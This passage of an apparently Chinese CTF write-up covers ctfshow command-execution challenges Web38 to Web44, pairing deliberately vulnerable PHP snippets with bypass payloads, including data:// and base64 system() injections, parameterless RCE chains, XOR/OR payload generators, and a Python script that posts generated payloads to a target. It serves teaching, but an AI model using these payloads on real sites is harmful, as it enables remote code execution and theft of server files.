invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​相较于上一个题多过滤了一层 php，使用 base64 绕过就行：</p><blockquote><p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><p>​或者，使用短标签绕过：</p><blockquote><p>?c=data://text/plain,<?= system("tac fla?.???");?></p></blockquote><h1 id="web39"><a class="markdownIt-Anchor" href="#web39">#</a> Web39：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​过滤了 flag，但是文件包含里存在.php 的后缀，好像无伤大雅，和上一题一样，短标签打。</p><blockquote><p>/?c=data://text/plain,<?= system("tac fla?.???");?></p></blockquote><p>​由于两端合在一起就类似于 <code>&lt;?= system('tac fla*');?&gt;.php</code> ，.php 因为已经被标签闭合在外面，所以不会被当作文件包含的后缀算进去，依旧能进行 RCE。</p><h1 id="web40"><a class="markdownIt-Anchor" href="#web40">#</a> Web40：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​过滤了数字，和各种符号，但是过滤似乎有点儿问题，没有过滤英文的括号，过滤成了中文的括号，所以，无参数 RCE，可以一把梭：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>​前置知识：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">localeconv</span>()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line"><span class="title function_ invoke__">current</span>() ：返回数组中的当前元素的值；默认取第一个值</span><br><span class="line"><span class="title function_ invoke__">pos</span>()：<span class="title function_ invoke__">current</span>() 的别名</span><br><span class="line"><span class="title function_ invoke__">reset</span>() 将 <span class="keyword">array</span> 的内部指针倒回到第一个单元并返回第一个数组单元的值。</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()：数组逆序</span><br><span class="line">(如果不是数组的最后一个或者倒数第二个呢？我们可以使用<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>())，<span class="title function_ invoke__">array_flip</span>()是交换数组的键和值，<span class="title function_ invoke__">array_rand</span>()是随机返回一个数组)</span><br><span class="line"><span class="title function_ invoke__">scandir</span>()：列出指定路径中的文件和目录</span><br><span class="line"><span class="title function_ invoke__">next</span>()：函数将内部指针向前移动一位即指向数组中的下一个元素，并输出这个元素。</span><br></pre></td></tr></table></figure><p>​或者使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看当前目录下文件</span><br><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)));</span><br><span class="line">找到flag.php</span><br><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line">高亮显示即可</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br></pre></td></tr></table></figure><h1 id="web41"><a class="markdownIt-Anchor" href="#web41">#</a> Web41：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​无字母数字 RCE，并且因为过滤了 $、+、-、^、~ 所以无法使用异或、自增和取反绕过，不过，听说网上还有另一个操作，就是利用管道符，也就是 | 运算符，这里贴一下相关的文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA5MTQzNDEzP29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyMTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0LnBjJTI1NUZibG9nLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5ibG9nfmZpcnN0X3JhbmtfdjJ+cmFua192MjktMS0xMDkxNDM0MTMucGNfdjJfcmFua19ibG9nX2RlZmF1bHQmYW1wO3V0bV90ZXJtPSVFNSU4RiU5NiVFNSU4RiU4RCZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQ0NTA=">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA4NTY5MDgw">ctfshow web 入门 web41</span></p><p>​这里给了两个代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​还有 python 的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><p>​另一个，贴一下羽神的脚本，这个感觉更好用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure><h1 id="web42"><a class="markdownIt-Anchor" href="#web42">#</a> Web42：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​对于这里的，可以参考下下面这篇文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGlueXdhbi9wLzYwMjU0NjguaHRtbA==">     Shell 脚本 ———— /dev/null 2&gt;&amp;1 详解 </span></p><p>​这里如果只是想要解题的话，可以想办法让后面的不执行，或者前后分离开就行了，这里有如下几种方法：</p><blockquote><p>; // 分号<br> | // 只执行后面那条命令<br> || // 只执行前面那条命令<br> &amp; // 两条命令都会执行<br> &amp;&amp; // 两条命令都会执行</p></blockquote><h1 id="web43"><a class="markdownIt-Anchor" href="#web43">#</a> Web43：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​对比上一题，多了一层过滤，多了一个 cat 和分号，老样子，同一个 payload：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac fla* ||</span><br></pre></td></tr></table></figure><p>​再一次，贴一下可以绕过的方式：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?c=more flag.php||</span><br><span class="line">?c=sort flag.php||</span><br><span class="line">?c=less flag.php||</span><br><span class="line">?c=tac flag.php||</span><br><span class="line">?c=tail flag.php||</span><br><span class="line">?c=nl flag.php||</span><br><span class="line">?c=strings flag.php||</span><br></pre></td></tr></table></figure><h1 id="web44"><a class="markdownIt-Anchor" href="#web44">#</a> Web44：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 